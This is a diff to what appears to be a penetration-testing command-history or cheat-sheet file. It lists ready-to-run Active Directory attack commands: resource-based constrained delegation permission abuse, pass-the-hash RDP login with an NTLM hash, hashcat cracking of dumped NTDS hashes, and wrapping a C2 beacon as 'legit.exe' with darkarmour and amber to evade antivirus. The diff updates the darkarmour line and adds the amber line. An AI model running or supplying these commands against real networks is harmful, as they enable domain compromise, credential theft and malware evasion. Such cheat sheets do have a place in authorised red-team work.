@@ -207,7 +207,8 @@ rbcd-permissions -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=SV01,OU
 rbcd-permissions --cleanup -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=SV01,OU=Computers,DC=DOMAIN,DC=LOCAL' -d BREAKING.BAD -u anonymous -p anonymous -l DC01.BREAKING.BAD
 rbcd-permissions -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=SV01,OU=Computers,DC=DOMAIN,DC=LOCAL' -d BREAKING.BAD -k -l DC01.BREAKING.BAD
 xfreerdp /d:BREAKING.BAD /u:someuser /pth:c1c635aa12ae60b7fe39e28456a7bac6 /v:SV01.BREAKING.BAD
-/opt/tools/darkarmour/darkarmour.py -f beacon.exe --encrypt xor --jmp --loop 7 -o legit.exe
+darkarmour -f /data/beacon.exe --encrypt xor --jmp --loop 7 -o /data/legit.exe
+amber -f beacon.exe
 hashcat -m 1000 BREAKING.BAD.ntds --show --username
 hashcat -m 1000 BREAKING.BAD.ntds --show
 hashcat -m 1000 BREAKING.BAD.ntds --show --username `fzf-wordlists`
